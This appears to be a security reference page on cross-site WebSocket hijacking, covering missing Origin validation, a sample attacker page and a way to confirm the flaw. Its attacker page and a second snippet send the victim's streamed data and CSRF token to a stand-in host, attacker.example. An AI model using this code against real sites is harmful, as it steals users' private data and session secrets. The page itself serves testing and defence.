---
title: "Cross-site WebSocket hijacking"
description: "A WebSocket handshake that relies on ambient cookies and skips Origin validation lets an attacker page open an authenticated socket as the victim."
keywords:
  - cross-site WebSocket hijacking
  - CSWSH
  - Origin validation
  - ambient cookies
  - CSRF WebSocket
---

# Cross-site WebSocket hijacking

The WebSocket handshake is an ordinary HTTP request, and the browser attaches the target site's cookies to it the same way it would for any other cross-origin request. If the server authorizes the upgrade purely on those ambient cookies and does not validate the `Origin` header, then any page the victim visits can open an authenticated socket to the target on their behalf. Unlike a form-based CSRF, the attacker's page keeps the socket open, so it can both drive actions and read every frame the server sends back.

> **Scope.** For authorized penetration tests, red-team engagements, CTF labs, and code review of systems you own or are contracted to assess.

## The handshake condition

The upgrade request carries the session cookie and an `Origin` reflecting the page that opened the socket:

```http
GET /stream HTTP/1.1
Host: target.example
Upgrade: websocket
Connection: Upgrade
Origin: https://attacker.example
Cookie: session=1f3c...; auth=...
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

If the server answers `101 Switching Protocols` despite the foreign `Origin`, the connection is hijackable. WebSocket handshakes are not protected by the same-origin policy for the open itself, and `WebSocket` does not send or require a CSRF token, so the cookie alone decides whether the socket is authenticated.

## The attacker page

The exploit is a page the victim is lured to open while logged in to the target. It opens the socket, which the browser authenticates with the victim's cookies, then exfiltrates whatever the server streams back:

```html
<script>
const ws = new WebSocket('wss://target.example/stream');

ws.onopen = () => {
  // Drive the victim's session: request their data
  ws.send(JSON.stringify({ action: 'message.list', conversationId: 'self' }));
  ws.send(JSON.stringify({ action: 'account.profile' }));
};

ws.onmessage = (event) => {
  // Relay every frame to the attacker's collector
  fetch('https://attacker.example/collect', {
    method: 'POST',
    mode: 'no-cors',
    body: event.data
  });
};
</script>
```

Because the socket runs with the victim's authority, the responses contain the victim's private conversations, profile, tokens, or any other data the stream exposes. The same channel also drives state-changing frames, so the attacker page can post messages, change settings, or invoke actions as the victim.

## Reading back session secrets

Some applications send bootstrap data on connect, for example a CSRF token or API key delivered in the first frame so the client can use it for subsequent REST calls. A hijacked socket receives that bootstrap frame directly:

```javascript
ws.onmessage = (event) => {
  const msg = JSON.parse(event.data);
  if (msg.csrfToken) {
    navigator.sendBeacon('https://attacker.example/token', msg.csrfToken);
  }
};
```

Harvesting that token promotes the hijack: the attacker now holds a value that unlocks the ordinary CSRF-protected REST surface as well.

## Confirming the weakness

Replay a captured handshake with the `Origin` header removed, then with an arbitrary foreign value, and watch for the `101` response in each case. A server that upgrades when `Origin` is absent or foreign, while still attaching the session, is open to hijacking. A socket that carries an unguessable token in the URL or in a subprotocol value, rather than relying on cookies, does not exhibit the same behavior.

## References

- PortSwigger Web Security Academy, "Cross-site WebSocket hijacking"
- OWASP, "Cross Site WebSocket Hijacking (CSWSH)"
